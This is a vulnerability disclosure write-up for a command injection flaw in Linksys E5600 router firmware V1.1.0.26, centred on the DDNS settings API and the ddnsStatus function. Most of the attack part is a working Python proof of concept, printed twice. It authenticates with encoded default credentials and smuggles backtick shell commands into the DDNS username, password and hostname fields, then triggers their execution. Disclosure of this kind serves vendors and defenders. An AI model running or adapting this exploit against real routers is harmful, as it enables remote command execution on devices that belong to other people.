# Linksys E5600 V1.1.0.26 command injection
## Product Information

    Device: Linksys E5600
    Firmware Version: V1.1.0.26
    Manufacturer's website information：https://www.linksys.com/
    Firmware download address ：https://downloads.linksys.com/support/assets/firmware/FW_E5600_1.1.0.26_prod.img

![image-20250224102758745](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304104409485.png)
## Vulnerability Description
Through the fcgi_control.lua file, it can be observed that when using the POST method with item set to 'obj', certain parameters of the router can be configured via parse.

![image-20250224110329468](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304104528779.png)

![image](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304104622900.png)

For example, using the following code, we can configure Dynamic DNS (DDNS) settings.
```python
import requests
import json

url1 = 'http://192.168.10.6/cgi-bin/login.cgi'
data1 = {"username":"YWRtaW4%3D","password":"MTIzNDU2","token":"","source":"web","cn":"","action":"auth"}

response1 = requests.post(url1, data=json.dumps(data1))
print(response1.text)

url2 = 'http://192.168.10.6/API/obj'
headers = {
    'Host': '192.168.10.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.10.6',
    'Referer': 'http://192.168.10.6/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {
    "ddns":{"DdnsP":{"enable":"1","username":"`ls>www/11.txt`","password":"`ls>www/12.txt`","hostname":"\';`ls>www/13.txt` ;#","provider":"no-ip.com","system":"0","mailex":"","backupmailex":"0","wildcard":"0","ip":"","status":""}}
}

response2 = requests.post(url2, headers=headers, data=json.dumps(data2))
print(response2.text)
```
However, in the file `usr\share\lua\runtime.lua`, the function `ddnsStatus` exists. When requesting the DDNS status, according to the program logic, it executes `objReq Ddns json` to retrieve the DDNS configuration information. If the return value of the executed command `ping -q -c 2 -w 2 8.8.8.8 > /dev/null 2>&1; echo $?` is not equal to 1, the program proceeds to execute code containing a command injection vulnerability. Command injection attacks can be achieved via the four parameters: `k.DdnsP.username`, `k.DdnsP.password`, `k.DdnsP.hostname`, and `k.DdnsP.mailex`.

![image](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304105024762.png)

## Payload
```python
import requests
import json

url1 = 'http://192.168.10.6/cgi-bin/login.cgi'
data1 = {"username":"YWRtaW4%3D","password":"MTIzNDU2","token":"","source":"web","cn":"","action":"auth"}

response1 = requests.post(url1, data=json.dumps(data1))
print(response1.text)

url2 = 'http://192.168.10.6/API/obj'
headers = {
    'Host': '192.168.10.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.10.6',
    'Referer': 'http://192.168.10.6/idp/idp_ping.html',
    'Cookie': response1.headers['Set-Cookie'].split(" ")[0],
}
data2 = {
    "ddns":{"DdnsP":{"enable":"1","username":"`ls>www/11.txt`","password":"`ls>www/12.txt`","hostname":"\';`ls>www/13.txt` ;#","provider":"no-ip.com","system":"0","mailex":"","backupmailex":"0","wildcard":"0","ip":"","status":""}}
}

response2 = requests.post(url2, headers=headers, data=json.dumps(data2))
print(response2.text)

url3 = 'http://192.168.10.6/API/info'
data3 = {
     'ddnsStatus': {
    }
}

response3 = requests.post(url3, headers=headers, data=json.dumps(data3))
print(response3.text)
```
For instance, using the aforementioned POC, we achieved an **ls command injection** and saved the output results in **www/11.txt**, **www/12.txt**, and **www/13.txt**. As shown in the figure below, the **ls command injection** was successfully executed.
[CI_ddnsStatus.py](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/CI_ddnsStatus.py)

![image](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304105424498.png)

![image](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304105505839.png)

![image](https://github.com/JZP018/Vuln/blob/main/linsys/E5600/CI_ddnsStatus/image-20250304105531119.png)


